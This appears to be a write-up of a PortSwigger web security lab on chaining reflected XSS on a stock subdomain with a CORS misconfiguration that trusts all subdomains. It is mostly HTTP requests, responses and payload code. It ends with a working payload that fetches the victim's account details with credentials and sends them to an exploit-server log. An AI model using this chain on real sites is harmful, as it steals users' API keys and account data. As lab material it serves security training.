This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 

# Solution

Request
```http
GET /accountDetails HTTP/2
Host: 0abe00bd04e8827b8009a38f001b0089.web-security-academy.net
Origin: http://a.0abe00bd04e8827b8009a38f001b0089.web-security-academy.net
```

Response
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: http://a.0abe00bd04e8827b8009a38f001b0089.web-security-academy.net
Access-Control-Allow-Credentials: true
```

Lab accepts CORS request from subdomain of lab url using the following protocols:
- http, https


## XSS

View a product page
```http
GET /product?productId=1 HTTP/2
Host: 0abe00bd04e8827b8009a38f001b0089.web-security-academy.net
Cookie: session=cVAm1E3q2WXdnRS8y7jL00zi6nvZfKLt
```

Response
```html
...
<script>
    const stockCheckForm = document.getElementById("stockCheckForm");
    stockCheckForm.addEventListener("submit", function(e) {
        const data = new FormData(stockCheckForm);
        window.open('http://stock.0abe00bd04e8827b8009a38f001b0089.web-security-academy.net/?productId=1&storeId=' + data.get('storeId'), 'stock', 'height=10,width=10,left=10,top=10,menubar=no,toolbar=no,location=no,status=no');
        e.preventDefault();
    });
</script>
...
```
- stockCheckForm sends a CORS request to http://stock.lab-url


Request to check stock:
```http
GET /?productId=1&storeId=1 HTTP/1.1
Host: stock.0abe00bd04e8827b8009a38f001b0089.web-security-academy.net
```

Response:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=6BqsYZi6wdhPJovhZ1FD1Bo20ZPxveHG; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 15

Stock level: 43
```
- tested storeId=invalid, no errors in response

Request to check stock again but this time with invalid productId:
```http
GET /?productId=invalid&storeId=1 HTTP/1.1
Host: stock.0abe00bd04e8827b8009a38f001b0089.web-security-academy.net
```

response
```http
HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=utf-8
Set-Cookie: session=ce8Avoy9nYnEzYb4Al3uHobiSB22SZZ9; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 41

<h4>ERROR</h4>Invalid product ID: invalid
```
- productId is reflected when invalid product ID is processed


Test same request with productId=`<script>alert(1)</script>` and the response is as follow:
```http
HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=utf-8
Set-Cookie: session=UO32sULJ9Aa7uCYrml154dKdlMQMSXH7; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 59

<h4>ERROR</h4>Invalid product ID: <script>alert(1)</script>
```
- productId query param is vulnerable to XSS


## XSS chain with CORS bypass

http://stock.lab-url/?productId=XSS&storeId=1 is vulnerable to XSS

Target server: lab-url which allows CORS from http://stock.lab-url

```html
<script>
    document.location="http://stock.0abe00bd04e8827b8009a38f001b0089.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0abe00bd04e8827b8009a38f001b0089.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a860011049c828a8001a24101cb004a.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
- payload sent to victim to redirect victim to `stock` subdomain and trigger XSS
- XSS payload will run the typical CORS payload

View access log to get API key
